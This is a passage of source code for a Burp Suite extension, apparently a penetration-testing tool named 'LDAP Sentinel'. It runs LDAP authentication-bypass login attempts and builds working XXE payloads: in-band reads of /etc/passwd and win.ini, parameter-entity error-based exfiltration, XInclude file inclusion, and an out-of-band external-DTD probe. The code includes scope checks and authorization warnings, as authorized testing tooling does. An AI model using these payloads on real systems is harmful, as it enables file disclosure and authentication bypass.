        self._callbacks = callbacks
        self._helpers = helpers
        self._cfg = config
        self._builder = builder
        self._detector = detector
        self._logger = logger
        self._ui = ui

    def run_dialog(self, message_info):
        # scope guard
        if self._cfg.ab_require_scope:
            try:
                url = self._helpers.analyzeRequest(message_info).getUrl()
                if not self._callbacks.isInScope(url):
                    JOptionPane.showMessageDialog(
                        None, "Target is NOT in Burp scope. Add it first.",
                        "LDAP Sentinel - blocked", JOptionPane.WARNING_MESSAGE)
                    return
            except Exception:
                return

        req_info = self._helpers.analyzeRequest(message_info)
        names = [p.getName() for p in req_info.getParameters()
                 if p.getType() != IParameter.PARAM_COOKIE and p.getName()]
        if not names:
            JOptionPane.showMessageDialog(
                None, "No URL/body parameters found in this request.",
                "LDAP Sentinel", JOptionPane.WARNING_MESSAGE)
            return

        user_guess = next((n for n in names if any(
            h in n.lower() for h in ("user", "uid", "login", "email", "mail"))),
            names[0])
        pass_guess = next((n for n in names if "pass" in n.lower()),
                          names[-1] if len(names) > 1 else names[0])

        user_box = JComboBox(names)
        user_box.setSelectedItem(user_guess)
        pass_box = JComboBox(names)
        pass_box.setSelectedItem(pass_guess)

        panel = JPanel()
        panel.setLayout(BoxLayout(panel, BoxLayout.Y_AXIS))
        panel.add(JLabel("Username / search field:"))
        panel.add(user_box)
        panel.add(JLabel("Password field:"))
        panel.add(pass_box)
        panel.add(JLabel(" "))
        panel.add(JLabel("This sends up to %d REAL login attempts."
                         % self._cfg.ab_max_attempts))
        panel.add(JLabel("Only run against systems you are authorized to test."))

        choice = JOptionPane.showConfirmDialog(
            None, panel, "LDAP Sentinel - Auth bypass test",
            JOptionPane.OK_CANCEL_OPTION, JOptionPane.WARNING_MESSAGE)
        if choice != JOptionPane.OK_OPTION:
            return

        u_field = user_box.getSelectedItem()
        p_field = pass_box.getSelectedItem()
        t = threading.Thread(
            target=lambda: self._run(message_info, u_field, p_field),
            name="ldap-authbypass")
        t.setDaemon(True)
        t.start()

    def _param_type(self, message_info, name):
        req_info = self._helpers.analyzeRequest(message_info)
        for p in req_info.getParameters():
            if p.getName() == name:
                return p.getType()
        return IParameter.PARAM_BODY

    def _enc(self, raw):
        if "%00" in raw:
            return "%00".join(self._helpers.urlEncode(p)
                              for p in raw.split("%00"))
        return self._helpers.urlEncode(raw)

    def _send_login(self, message_info, u_field, u_val, p_field, p_val):
        try:
            req = message_info.getRequest()
            svc = message_info.getHttpService()
            up = self._helpers.buildParameter(
                u_field, self._enc(u_val),
                self._param_type(message_info, u_field))
            req = self._helpers.updateParameter(req, up)
            if p_field and p_field != u_field:
                pp = self._helpers.buildParameter(
                    p_field, self._enc(p_val),
                    self._param_type(message_info, p_field))
                req = self._helpers.updateParameter(req, pp)
            if self._cfg.rate_limit_ms > 0:
                time.sleep(self._cfg.rate_limit_ms / 1000.0)
            rr = self._callbacks.makeHttpRequest(svc, req)
            rb = rr.getResponse() if rr is not None else None
            if rb is None:
                return None, None
            return self._detector.model(rb), rr
        except Exception:
            self._logger.error("auth-bypass send", sys.exc_info())
            return None, None

    def _run(self, message_info, u_field, p_field):
        self._logger.info("=== Auth bypass test: user=%s pass=%s ==="
                          % (u_field, p_field))
        # baseline: a deliberately-failing login
        fuser = "zzqnouser" + rand_tail(4)
        fpass = "zzqnopass" + rand_tail(4)
        base, _rr = self._send_login(message_info, u_field, fuser, p_field, fpass)
        if base is None:
            self._logger.info("baseline request failed; abort")
            return
        self._logger.info("baseline(fail): status=%s len=%s"
                          % (base.status, base.length))

        lines = ["== LDAP Sentinel - Auth bypass results =="]
        lines.append("user field: %s   pass field: %s" % (u_field, p_field))
        lines.append("baseline(fail): status=%s len=%s cookie=%s"
                     % (base.status, base.length, base.set_cookie))
        bypass_rr = None
        attempts = 0
        for uval, pval, label in self.PAYLOADS:
            if attempts >= self._cfg.ab_max_attempts:
                break
            attempts += 1
            uu = uval.replace("{U}", "admin")
            model, rr = self._send_login(message_info, u_field, uu, p_field, pval)
            if model is None:
                lines.append("[-] %s -> request failed" % label)
                continue
            differ, detail = responses_differ(base, model)
            looks_bypass = (differ and (model.has_success or model.set_cookie
                            or model.location) and not model.has_failure)
            verdict = "LIKELY BYPASS" if looks_bypass else "no change"
            lines.append("%s %s" % ("[+]" if looks_bypass else "[-]", label))
            lines.append("      %s  [%s] status=%s len=%s %s"
                         % (verdict, ",".join(detail) or "-", model.status,
                            model.length, "cookie" if model.set_cookie else ""))
            self._logger.info("  %-30s -> %s" % (label, verdict))
            if looks_bypass and bypass_rr is None:
                bypass_rr = rr
            if looks_bypass and self._cfg.ab_stop_on_success:
                self._logger.info("  stop-on-success: halting further attempts")
                break

        if bypass_rr is not None:
            lines.append("")
            lines.append("Likely-bypass request sent to Repeater as PoC.")
            try:
                svc = bypass_rr.getHttpService()
                self._callbacks.sendToRepeater(
                    svc.getHost(), svc.getPort(), svc.getProtocol() == "https",
                    bypass_rr.getRequest(), "LDAP-AuthBypass")
            except Exception:
                self._logger.error("repeater", sys.exc_info())
        else:
            lines.append("")
            lines.append("No clear bypass observed.")
        self._ui.set_detail("\n".join(lines))
        self._logger.info("auth-bypass test complete (%d attempts)" % attempts)



# ===========================================================================
#  XXE signatures + oracles
# ===========================================================================
XML_ERROR_SIGNATURES = [
    _c(r"DOCTYPE\s+is\s+disallowed"),
    _c(r"DTD\s+(?:is\s+)?prohibited"),
    _c(r"DOCTYPEDECL"),
    _c(r"Content\s+is\s+not\s+allowed\s+in\s+prolog"),
    _c(r"org\.xml\.sax"),
    _c(r"javax\.xml\."),
    _c(r"xmlParseEntityRef"),
    _c(r"xmlParse\w+"),
    _c(r"lxml\.etree\.XMLSyntaxError"),
    _c(r"ExpatError"),
    _c(r"System\.Xml\.XmlException"),
    _c(r"SAXParseException"),
    _c(r"premature\s+end\s+of\s+data"),
    _c(r"undefined\s+entity"),
    _c(r"EntityRef"),
]

# file-content oracles: (regex, label)
_PASSWD_ORACLE = (_c(r"root:.*?:0:0:"), "linux /etc/passwd")
_WININI_ORACLE = (_c(r"(?mi)^\s*\[(?:fonts|extensions|mci extensions)\]"),
                  "windows win.ini")


def xml_error_hits(body):
    out = []
    for rgx in XML_ERROR_SIGNATURES:
        m = rgx.search(body)
        if m:
            out.append(m.group(0))
    return out


# ===========================================================================
#  XmlTargeter : discover XML leaf elements in a request body
# ===========================================================================
class XmlTargeter(object):

    LEAF = re.compile(r'(<([A-Za-z_][\w\.\-:]*)[^>]*>)([^<>]*)(</\2>)')
    PROLOG = re.compile(r'^\s*<\?xml[^>]*\?>', re.IGNORECASE)

    def __init__(self, utils):
        self._utils = utils

    def is_xml(self, ctype, body):
        if ctype and ("xml" in ctype.lower()):
            return True
        # content-sniff: looks like an XML document
        head = (body or "")[:200].lstrip()
        return head.startswith("<?xml") or bool(
            re.match(r'<[A-Za-z_][\w\.\-:]*[\s>]', head))

    def leaves(self, body, limit):
        """Return list of {occ, name} for text-bearing leaf elements."""
        out = []
        for i, m in enumerate(self.LEAF.finditer(body)):
            if len(out) >= limit:
                break
            out.append({"occ": i, "name": m.group(2)})
        return out


# ===========================================================================
#  XxeRequestBuilder : inject a DOCTYPE + entity ref into one XML leaf
# ===========================================================================
class XxeRequestBuilder(object):

    LEAF = re.compile(r'(<([A-Za-z_][\w\.\-:]*)[^>]*>)([^<>]*)(</\2>)')
    PROLOG = re.compile(r'(<\?xml[^>]*\?>)', re.IGNORECASE)

    def __init__(self, helpers, utils, config):
        self._helpers = helpers
        self._utils = utils
        self._cfg = config

    def _set_leaf_text(self, body, occ, new_text):
        counter = [0]

        def repl(m):
            idx = counter[0]
            counter[0] += 1
            if idx == occ:
                return m.group(1) + new_text + m.group(4)
            return m.group(0)
        return self.LEAF.sub(repl, body)

    def _inject_doctype(self, body, doctype):
        """Insert a DOCTYPE right after the XML prolog (or at the very top)."""
        if self.PROLOG.search(body):
            return self.PROLOG.sub(lambda m: m.group(1) + "\n" + doctype, body, 1)
        return doctype + "\n" + body

    def build(self, request, body, occ, doctype, leaf_text):
        """Return new request bytes: DOCTYPE injected + leaf text replaced."""
        try:
            new_body = self._set_leaf_text(body, occ, leaf_text)
            new_body = self._inject_doctype(new_body, doctype)
            req_info = self._helpers.analyzeRequest(request)
            headers = req_info.getHeaders()
            return self._helpers.buildHttpMessage(
                headers, self._helpers.stringToBytes(new_body))
        except Exception:
            return None

    def build_raw_body(self, request, new_body):
        try:
            req_info = self._helpers.analyzeRequest(request)
            headers = req_info.getHeaders()
            return self._helpers.buildHttpMessage(
                headers, self._helpers.stringToBytes(new_body))
        except Exception:
            return None


# ===========================================================================
#  XXE payload factory  (OOB-free by default)
# ===========================================================================
def xxe_reflect_probe(cfg):
    """Stage 0: internal entity whose expansion proves DTD processing.
    Returns (doctype, leaf_text, needle)."""
    tok = cfg.canary + rand_tail(4)
    doctype = '<!DOCTYPE r [<!ENTITY %s "%s">]>' % ("x" + tok, tok)
    return doctype, "&x%s;" % tok, tok


def xxe_error_probe():
    """Stage 1: a broken entity ref -> forces a parser error."""
    doctype = '<!DOCTYPE r [<!ENTITY brk SYSTEM "nope://%s">]>' % rand_tail(4)
    return doctype, "&brk;"


def xxe_file_targets(cfg):
    """Return list of (uri, oracle_regex, oracle_label) for enabled oracles."""
    out = []
    if cfg.xxe_linux_oracle:
        out.append(("file:///etc/passwd", _PASSWD_ORACLE[0], _PASSWD_ORACLE[1]))
    if cfg.xxe_windows_oracle:
        out.append(("file:///c:/windows/win.ini", _WININI_ORACLE[0],
                    _WININI_ORACLE[1]))
    cp = cfg.xxe_custom_file.strip()
    if cp:
        uri = cp if "://" in cp else ("file://" + cp if cp.startswith("/")
                                      else "file:///" + cp)
        # custom path has no built-in oracle; any non-empty, non-reflected
        # content between markers counts (handled by the detector wrap).
        out.append((uri, None, "custom:" + cp))
    return out


def xxe_file_read(uri, token):
    """Stage 2: classic in-band file read, token-wrapped for a clean oracle.
    Returns (doctype, leaf_text)."""
    doctype = '<!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]>' % uri
    # wrap the entity between tokens so the detector can anchor real content
    return doctype, "%sa&xxe;%sb" % (token, token)


def xxe_error_exfil(uri):
    """Stage 3: parameter-entity error-based exfil (no reflection needed).
    Returns a full replacement body fragment as a DOCTYPE block."""
    # The file content is forced into a parser error message.
    doctype = (
        '<!DOCTYPE r [\n'
        '  <!ENTITY %% f SYSTEM "%s">\n'
        '  <!ENTITY %% e "<!ENTITY &#x25; x SYSTEM '
        '\'file:///nonexistent-%s/%%f;\'>">\n'
        '  %%e; %%x;\n'
        ']>' % (uri, rand_tail(4))
    )
    return doctype


def xxe_xinclude_body(root_name, uri, token):
    """Stage 4: XInclude text include (used when DOCTYPE can't be set).
    Returns a complete XML body."""
    return (
        '<?xml version="1.0"?>\n'
        '<%s xmlns:xi="http://www.w3.org/2001/XInclude">'
        '%sa<xi:include parse="text" href="%s"/>%sb'
        '</%s>' % (root_name, token, uri, token, root_name)
    )


def xxe_oob_probe(cfg, token):
    """OOB external-DTD probe (only if xxe_oob AND xxe_oob_host set)."""
    host = cfg.xxe_oob_host.strip()
    if not host:
        return None, None
    if "://" not in host:
        host = "http://" + host
    doctype = ('<!DOCTYPE r [<!ENTITY %% dtd SYSTEM "%s/%s.dtd"> %%dtd;]>'
               % (host.rstrip("/"), token))
    return doctype, "&send;"


# ===========================================================================
#  XxeDetector
# ===========================================================================
class XxeDetector(object):

    def __init__(self, helpers, config):
        self._helpers = helpers
        self._cfg = config

    def body_str(self, response):
        if response is None:
            return ""
        offset = self._helpers.analyzeResponse(response).getBodyOffset()
        return self._helpers.bytesToString(response)[offset:]

    def status_length(self, response):
        if response is None:
            return 0, 0
        info = self._helpers.analyzeResponse(response)
        return info.getStatusCode(), len(response) - info.getBodyOffset()

    def reflected(self, response, needle, baseline_body):
        """Stage 0: internal entity expanded (needle present + NEW vs base)."""
        body = self.body_str(response)
        if needle in body and needle not in (baseline_body or ""):
            return True
        return False

    def new_parser_error(self, response, baseline_body):
        body = self.body_str(response)
        hits = xml_error_hits(body)
        if not hits:
            return None
        base_hits = xml_error_hits(baseline_body or "")
        new = [h for h in hits if h not in base_hits]
        return new[0] if new else None

    def file_evidence(self, response, oracle_regex, token, sent_payload,
                      baseline_body):
        """Stage 2/4: confirm real file content between the wrap tokens.

        oracle_regex (passwd/win.ini) must match; for a custom path with no
        oracle, any non-trivial text between <token>a .. <token>b that is NOT
        just our own payload reflected counts."""
        body = self.body_str(response)
        base = baseline_body or ""

        if oracle_regex is not None:
            m = oracle_regex.search(body)
            if not m:
                return None
            if oracle_regex.search(base):
                return None       # already on the baseline page
            matched = m.group(0)
            if matched.strip() and matched.strip() in (sent_payload or ""):
                return None       # reflection of our own payload, not a read
            return matched[:160]

        # custom path: anchor between wrap tokens
        a = token + "a"
        b = token + "b"
        try:
            start = body.index(a) + len(a)
            end = body.index(b, start)
        except ValueError:
            return None
        inner = body[start:end].strip()
        if not inner:
            return None
        # reject if it's just our URI/payload echoed back
        if inner in (sent_payload or "") or "xi:include" in inner \
                or "ENTITY" in inner or inner.startswith("&"):
            return None
        if (a + inner + b) in base:
            return None
        return inner[:160]

    def oob_hit(self, callbacks, token):
        """Best-effort: check Collaborator-less OOB via Burp's own history is
        out of scope; OOB confirmation is left to the user's listener."""
        return None


# ===========================================================================
#  BurpExtender  (single tab; LDAP + XPath + XXE all report into it)
# ===========================================================================
class BurpExtender(IBurpExtender, IHttpListener, IExtensionStateListener,
                   IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("LDAP Sentinel")

        stdout = PrintWriter(callbacks.getStdout(), True)
        self._cfg = Config()
        self._utils = Utilities(self._helpers)
        self._logger = Logger(stdout, self._cfg)
        self._parser = ParameterParser(self._helpers, self._utils, self._cfg)
        self._builder = RequestBuilder(self._helpers, self._utils, self._cfg)
        self._detector = InjectionDetector(self._helpers, self._cfg)

        self._ui = ExtensionUI(callbacks, self._cfg, self._logger)
        self._logger.attach_ui(self._ui)

        self._scanner = Scanner(callbacks, self._helpers, self._cfg,
                                self._utils, self._parser, self._builder,
                                self._detector, self._logger, self._ui)
        self._ui._scanner = self._scanner

        self._authbypass = AuthBypass(callbacks, self._helpers, self._cfg,
                                      self._builder, self._detector,
                                      self._logger, self._ui)

        callbacks.addSuiteTab(self._ui)
        callbacks.registerHttpListener(self)
        callbacks.registerExtensionStateListener(self)
        callbacks.registerContextMenuFactory(self)

        self._scanner.start()
        self._logger.info("LDAP Sentinel loaded (created by asad0x0). "
                          "Covers LDAP + XPath + XXE in one tab. Right-click a "
                          "request -> 'LDAP Sentinel' for force-scan or "
                          "auth-bypass test.")

    # ---- right-click context menu -------------------------------------
    def createMenuItems(self, invocation):
        try:
            messages = invocation.getSelectedMessages()
        except Exception:
            messages = None
        if not messages:
            return None
        menu = ArrayList()
        scan_item = JMenuItem("LDAP Sentinel: Scan this request")
        scan_item.addActionListener(self._SendTo(self, messages))
        menu.add(scan_item)
        ab_item = JMenuItem("LDAP Sentinel: Auth bypass test")
        ab_item.addActionListener(self._AuthBypassMenu(self, messages[0]))
        menu.add(ab_item)
        return menu

    class _SendTo(ActionListener):
        def __init__(self, ext, messages):
            self.ext = ext
            self.messages = messages

        def actionPerformed(self, event):
            try:
                self.ext._scanner.scan_messages(self.messages)
            except Exception:
                self.ext._logger.error("menu scan", sys.exc_info())

    class _AuthBypassMenu(ActionListener):
        def __init__(self, ext, message):
            self.ext = ext
            self.message = message

        def actionPerformed(self, event):
            try:
                self.ext._authbypass.run_dialog(self.message)
            except Exception:
                self.ext._logger.error("menu authbypass", sys.exc_info())

    def processHttpMessage(self, tool_flag, message_is_request, message_info):
        try:
            if message_is_request:
                return
            if tool_flag != self._callbacks.TOOL_PROXY:
                return
            if not self._cfg.enabled:
                return
            self._scanner.schedule(message_info)
        except Exception:
            self._logger.error("processHttpMessage", sys.exc_info())

    def extensionUnloaded(self):
        try:
            self._scanner.stop()
            self._logger.info("LDAP Sentinel unloaded. Workers stopped.")
        except Exception:
            pass
